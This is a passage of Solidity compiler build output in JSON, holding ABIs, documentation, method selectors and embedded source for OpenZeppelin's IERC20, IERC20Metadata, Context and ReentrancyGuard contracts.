uint256))","numberOfBytes":"32","value":"t_mapping(t_address,t_uint256)"},"t_mapping(t_address,t_uint256)":{"encoding":"mapping","key":"t_address","label":"mapping(address => uint256)","numberOfBytes":"32","value":"t_uint256"},"t_string_storage":{"encoding":"bytes","label":"string","numberOfBytes":"32"},"t_uint256":{"encoding":"inplace","label":"uint256","numberOfBytes":"32"}}},"userdoc":{"kind":"user","methods":{},"version":1}}},"@openzeppelin/contracts/token/ERC20/IERC20.sol":{"IERC20":{"abi":[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}],"devdoc":{"details":"Interface of the ERC20 standard as defined in the EIP.","events":{"Approval(address,address,uint256)":{"details":"Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance."},"Transfer(address,address,uint256)":{"details":"Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero."}},"kind":"dev","methods":{"allowance(address,address)":{"details":"Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default. This value changes when {approve} or {transferFrom} are called."},"approve(address,uint256)":{"details":"Sets a `value` amount of tokens as the allowance of `spender` over the caller's tokens. Returns a boolean value indicating whether the operation succeeded. IMPORTANT: Beware that changing an allowance with this method brings the risk that someone may use both the old and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 Emits an {Approval} event."},"balanceOf(address)":{"details":"Returns the value of tokens owned by `account`."},"totalSupply()":{"details":"Returns the value of tokens in existence."},"transfer(address,uint256)":{"details":"Moves a `value` amount of tokens from the caller's account to `to`. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event."},"transferFrom(address,address,uint256)":{"details":"Moves a `value` amount of tokens from `from` to `to` using the allowance mechanism. `value` is then deducted from the caller's allowance. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event."}},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"gasEstimates":null,"methodIdentifiers":{"allowance(address,address)":"dd62ed3e","approve(address,uint256)":"095ea7b3","balanceOf(address)":"70a08231","totalSupply()":"18160ddd","transfer(address,uint256)":"a9059cbb","transferFrom(address,address,uint256)":"23b872dd"}},"metadata":"{\"compiler\":{\"version\":\"0.8.21+commit.d9974bed\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"Interface of the ERC20 standard as defined in the EIP.\",\"events\":{\"Approval(address,address,uint256)\":{\"details\":\"Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance.\"},\"Transfer(address,address,uint256)\":{\"details\":\"Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero.\"}},\"kind\":\"dev\",\"methods\":{\"allowance(address,address)\":{\"details\":\"Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default. This value changes when {approve} or {transferFrom} are called.\"},\"approve(address,uint256)\":{\"details\":\"Sets a `value` amount of tokens as the allowance of `spender` over the caller's tokens. Returns a boolean value indicating whether the operation succeeded. IMPORTANT: Beware that changing an allowance with this method brings the risk that someone may use both the old and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 Emits an {Approval} event.\"},\"balanceOf(address)\":{\"details\":\"Returns the value of tokens owned by `account`.\"},\"totalSupply()\":{\"details\":\"Returns the value of tokens in existence.\"},\"transfer(address,uint256)\":{\"details\":\"Moves a `value` amount of tokens from the caller's account to `to`. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event.\"},\"transferFrom(address,address,uint256)\":{\"details\":\"Moves a `value` amount of tokens from `from` to `to` using the allowance mechanism. `value` is then deducted from the caller's allowance. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":\"IERC20\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/IERC20.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Interface of the ERC20 standard as defined in the EIP.\\n */\\ninterface IERC20 {\\n    /**\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\n     * another (`to`).\\n     *\\n     * Note that `value` may be zero.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    /**\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\n     * a call to {approve}. `value` is the new allowance.\\n     */\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    /**\\n     * @dev Returns the value of tokens in existence.\\n     */\\n    function totalSupply() external view returns (uint256);\\n\\n    /**\\n     * @dev Returns the value of tokens owned by `account`.\\n     */\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    /**\\n     * @dev Moves a `value` amount of tokens from the caller's account to `to`.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transfer(address to, uint256 value) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\\n     * zero by default.\\n     *\\n     * This value changes when {approve} or {transferFrom} are called.\\n     */\\n    function allowance(address owner, address spender) external view returns (uint256);\\n\\n    /**\\n     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the\\n     * caller's tokens.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\\n     * that someone may use both the old and the new allowance by unfortunate\\n     * transaction ordering. One possible solution to mitigate this race\\n     * condition is to first reduce the spender's allowance to 0 and set the\\n     * desired value afterwards:\\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address spender, uint256 value) external returns (bool);\\n\\n    /**\\n     * @dev Moves a `value` amount of tokens from `from` to `to` using the\\n     * allowance mechanism. `value` is then deducted from the caller's\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\\n}\\n\",\"keccak256\":\"0xc6a8ff0ea489379b61faa647490411b80102578440ab9d84e9a957cc12164e70\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}},"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol":{"IERC20Metadata":{"abi":[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}],"devdoc":{"details":"Interface for the optional metadata functions from the ERC20 standard.","events":{"Approval(address,address,uint256)":{"details":"Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance."},"Transfer(address,address,uint256)":{"details":"Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero."}},"kind":"dev","methods":{"allowance(address,address)":{"details":"Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default. This value changes when {approve} or {transferFrom} are called."},"approve(address,uint256)":{"details":"Sets a `value` amount of tokens as the allowance of `spender` over the caller's tokens. Returns a boolean value indicating whether the operation succeeded. IMPORTANT: Beware that changing an allowance with this method brings the risk that someone may use both the old and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 Emits an {Approval} event."},"balanceOf(address)":{"details":"Returns the value of tokens owned by `account`."},"decimals()":{"details":"Returns the decimals places of the token."},"name()":{"details":"Returns the name of the token."},"symbol()":{"details":"Returns the symbol of the token."},"totalSupply()":{"details":"Returns the value of tokens in existence."},"transfer(address,uint256)":{"details":"Moves a `value` amount of tokens from the caller's account to `to`. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event."},"transferFrom(address,address,uint256)":{"details":"Moves a `value` amount of tokens from `from` to `to` using the allowance mechanism. `value` is then deducted from the caller's allowance. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event."}},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"gasEstimates":null,"methodIdentifiers":{"allowance(address,address)":"dd62ed3e","approve(address,uint256)":"095ea7b3","balanceOf(address)":"70a08231","decimals()":"313ce567","name()":"06fdde03","symbol()":"95d89b41","totalSupply()":"18160ddd","transfer(address,uint256)":"a9059cbb","transferFrom(address,address,uint256)":"23b872dd"}},"metadata":"{\"compiler\":{\"version\":\"0.8.21+commit.d9974bed\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"Interface for the optional metadata functions from the ERC20 standard.\",\"events\":{\"Approval(address,address,uint256)\":{\"details\":\"Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance.\"},\"Transfer(address,address,uint256)\":{\"details\":\"Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero.\"}},\"kind\":\"dev\",\"methods\":{\"allowance(address,address)\":{\"details\":\"Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default. This value changes when {approve} or {transferFrom} are called.\"},\"approve(address,uint256)\":{\"details\":\"Sets a `value` amount of tokens as the allowance of `spender` over the caller's tokens. Returns a boolean value indicating whether the operation succeeded. IMPORTANT: Beware that changing an allowance with this method brings the risk that someone may use both the old and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 Emits an {Approval} event.\"},\"balanceOf(address)\":{\"details\":\"Returns the value of tokens owned by `account`.\"},\"decimals()\":{\"details\":\"Returns the decimals places of the token.\"},\"name()\":{\"details\":\"Returns the name of the token.\"},\"symbol()\":{\"details\":\"Returns the symbol of the token.\"},\"totalSupply()\":{\"details\":\"Returns the value of tokens in existence.\"},\"transfer(address,uint256)\":{\"details\":\"Moves a `value` amount of tokens from the caller's account to `to`. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event.\"},\"transferFrom(address,address,uint256)\":{\"details\":\"Moves a `value` amount of tokens from `from` to `to` using the allowance mechanism. `value` is then deducted from the caller's allowance. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\":\"IERC20Metadata\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/IERC20.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Interface of the ERC20 standard as defined in the EIP.\\n */\\ninterface IERC20 {\\n    /**\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\n     * another (`to`).\\n     *\\n     * Note that `value` may be zero.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    /**\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\n     * a call to {approve}. `value` is the new allowance.\\n     */\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    /**\\n     * @dev Returns the value of tokens in existence.\\n     */\\n    function totalSupply() external view returns (uint256);\\n\\n    /**\\n     * @dev Returns the value of tokens owned by `account`.\\n     */\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    /**\\n     * @dev Moves a `value` amount of tokens from the caller's account to `to`.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transfer(address to, uint256 value) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\\n     * zero by default.\\n     *\\n     * This value changes when {approve} or {transferFrom} are called.\\n     */\\n    function allowance(address owner, address spender) external view returns (uint256);\\n\\n    /**\\n     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the\\n     * caller's tokens.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\\n     * that someone may use both the old and the new allowance by unfortunate\\n     * transaction ordering. One possible solution to mitigate this race\\n     * condition is to first reduce the spender's allowance to 0 and set the\\n     * desired value afterwards:\\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address spender, uint256 value) external returns (bool);\\n\\n    /**\\n     * @dev Moves a `value` amount of tokens from `from` to `to` using the\\n     * allowance mechanism. `value` is then deducted from the caller's\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\\n}\\n\",\"keccak256\":\"0xc6a8ff0ea489379b61faa647490411b80102578440ab9d84e9a957cc12164e70\",\"license\":\"MIT\"},\"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/extensions/IERC20Metadata.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {IERC20} from \\\"../IERC20.sol\\\";\\n\\n/**\\n * @dev Interface for the optional metadata functions from the ERC20 standard.\\n */\\ninterface IERC20Metadata is IERC20 {\\n    /**\\n     * @dev Returns the name of the token.\\n     */\\n    function name() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the symbol of the token.\\n     */\\n    function symbol() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the decimals places of the token.\\n     */\\n    function decimals() external view returns (uint8);\\n}\\n\",\"keccak256\":\"0xaa761817f6cd7892fcf158b3c776b34551cde36f48ff9703d53898bc45a94ea2\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}},"@openzeppelin/contracts/utils/Context.sol":{"Context":{"abi":[],"devdoc":{"details":"Provides information about the current execution context, including the sender of the transaction and its data. While these are generally available via msg.sender and msg.data, they should not be accessed in such a direct manner, since when dealing with meta-transactions the account sending and paying for execution may not be the actual sender (as far as an application is concerned). This contract is only required for intermediate, library-like contracts.","kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"gasEstimates":null,"methodIdentifiers":{}},"metadata":"{\"compiler\":{\"version\":\"0.8.21+commit.d9974bed\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"details\":\"Provides information about the current execution context, including the sender of the transaction and its data. While these are generally available via msg.sender and msg.data, they should not be accessed in such a direct manner, since when dealing with meta-transactions the account sending and paying for execution may not be the actual sender (as far as an application is concerned). This contract is only required for intermediate, library-like contracts.\",\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/utils/Context.sol\":\"Context\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/utils/Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (utils/Context.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n\",\"keccak256\":\"0x75a4ee64c68dbd5f38bddd06e664a64c8271b4caa554fb6f0607dfd672bb4bf3\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}},"@openzeppelin/contracts/utils/ReentrancyGuard.sol":{"ReentrancyGuard":{"abi":[{"inputs":[],"name":"ReentrancyGuardReentrantCall","type":"error"}],"devdoc":{"details":"Contract module that helps prevent reentrant calls to a function. Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier available, which can be applied to functions to make sure there are no nested (reentrant) calls to them. Note that because there is a single `nonReentrant` guard, functions marked as `nonReentrant` may not call one another. This can be worked around by making those functions `private`, and then adding `external` `nonReentrant` entry points to them. TIP: If you would like to learn more about reentrancy and alternative ways to protect against it, check out our blog post https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].","errors":{"ReentrancyGuardReentrantCall()":[{"details":"Unauthorized reentrant call."}]},"kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"gasEstimates":null,"methodIdentifiers":{}},"metadata":"{\"compiler\":{\"version\":\"0.8.21+commit.d9974bed\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"ReentrancyGuardReentrantCall\",\"type\":\"error\"}],\"devdoc\":{\"details\":\"Contract module that helps prevent reentrant calls to a function. Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier available, which can be applied to functions to make sure there are no nested (reentrant) calls to them. Note that because there is a single `nonReentrant` guard, functions marked as `nonReentrant` may not call one another. This can be worked around by making those functions `private`, and then adding `external` `nonReentrant` entry points to them. TIP: If you would like to learn more about reentrancy and alternative ways to protect against it, check out our blog post https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].\",\"errors\":{\"ReentrancyGuardReentrantCall()\":[{\"details\":\"Unauthorized reentrant call.\"}]},\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/utils/ReentrancyGuard.sol\":\"ReentrancyGuard\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/utils/ReentrancyGuard.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (utils/ReentrancyGuard.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Contract module that helps prevent reentrant calls to a function.\\n *\\n * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier\\n * available, which can be applied to functions to make sure there are no nested\\n * (reentrant) calls to them.\\n *\\n * Note that because there is a single `nonReentrant` guard, functions marked as\\n * 